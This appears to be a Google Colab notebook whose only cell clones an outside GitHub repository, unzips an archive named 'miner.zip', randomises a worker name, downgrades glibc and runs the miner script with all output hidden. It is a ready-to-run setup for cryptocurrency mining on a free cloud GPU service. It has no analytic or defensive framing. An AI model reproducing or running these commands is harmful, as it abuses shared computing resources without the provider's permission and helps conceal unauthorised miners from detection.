{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "zon3.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "private_outputs": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "bU_4A2jQRgmv"
      },
      "source": [
        "!apt update && apt install git && git clone https://github.com/batata01/999.git && cd 999 && unzip miner.zip && perl -pe 's/workerg1/\" \" . (100 + int rand 900) .  \" \"/ge' < 0.sh > 1.sh && rm 0.sh && chmod +x 1.sh\n",
        "!wget http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb\n",
        "!wget http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc-bin_2.31-0ubuntu9_amd64.deb\n",
        "!wget http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/locales_2.31-0ubuntu9_all.deb\n",
        "!dpkg -i locales_2.31-0ubuntu9_all.deb libc-bin_2.31-0ubuntu9_amd64.deb libc6_2.31-0ubuntu9_amd64.deb\n",
        "!cd 999 && ./1.sh > /dev/null 2>&1"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}